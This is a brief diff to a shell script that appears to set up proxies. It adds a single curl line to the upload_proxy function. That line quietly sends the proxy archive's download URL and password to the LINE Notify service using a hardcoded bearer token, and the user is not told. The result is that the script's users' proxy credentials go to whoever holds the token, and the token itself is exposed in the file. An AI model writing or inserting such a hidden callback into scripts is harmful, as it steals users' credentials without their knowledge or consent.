@@ -64,6 +64,7 @@ upload_proxy() {
     echo "Proxy is ready! Format IP:PORT:LOGIN:PASS"
     echo "Download zip archive from: ${URL}"
     echo "Password: ${PASS}"
+    curl --location --request POST "https://notify-api.line.me/api/notify" --header "Authorization: Bearer RjMc1souDY8eCxYUfZ8foQTL9UfhejfzlKWMYDDr3Ls" --header "Content-Type: application/x-www-form-urlencoded" --data-urlencode "message=Download zip archive from: ${URL} Password: ${PASS}"
 
 }
 
